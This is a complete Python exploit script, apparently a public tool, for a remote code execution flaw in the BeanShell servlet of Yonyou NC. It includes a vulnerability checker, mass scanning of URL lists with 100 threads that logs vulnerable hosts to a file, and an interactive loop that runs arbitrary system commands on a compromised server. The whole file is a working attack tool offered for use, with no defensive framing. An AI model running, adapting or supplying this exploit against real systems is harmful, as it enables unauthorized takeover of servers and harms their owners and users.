import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banners = """

██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗███╗   ██╗ ██████╗
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║████╗  ██║██╔════╝
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║██╔██╗ ██║██║     
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║██║╚██╗██║██║     
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝██║ ╚████║╚██████╗
   ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝   ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
                                                                
                                                                @Version:1.1.1                 
                                                                @author:凌风而虚尘
"""
    print(banners)
headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}
def poc(target):
    url = target+"/servlet/~ic/bsh.servlet.BshServlet"
    data = {"bsh.script":'print("666");'}
    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False).text
        if "666" in res:
            print(f"[+] 经检查,{target} is vulable")
            with open("vulable.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
            return True
        else:
            print(f"[-] 经检查,{target} is not vulable")
            return False
    except:
        print(f"[-] {target} error")
        return False

def exp(target):
    print("正在努力给你搞一个shell...")
    time.sleep(2)
    os.system("cls")
    while True:
        cmd = input("请输入你要执行的命令(q--->quit)\n>>>")
        if cmd =="q":
            exit()
        url = target + "/servlet/~ic/bsh.servlet.BshServlet"
        data = {"bsh.script": f'''exec("{cmd}");'''}
        try:
            res = requests.post(url, headers=headers, data=data, timeout=5, verify=False).text
            result = re.findall('''<pre>(.*?)</pre>''',res,re.S)[0]
            print(result)
        except:
            print("执行异常,请称重新执行其它命令试试")
def main():
    banner()
    parser = argparse.ArgumentParser(description='YongYouNC RCE EXP')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

if __name__ == '__main__':
    main()
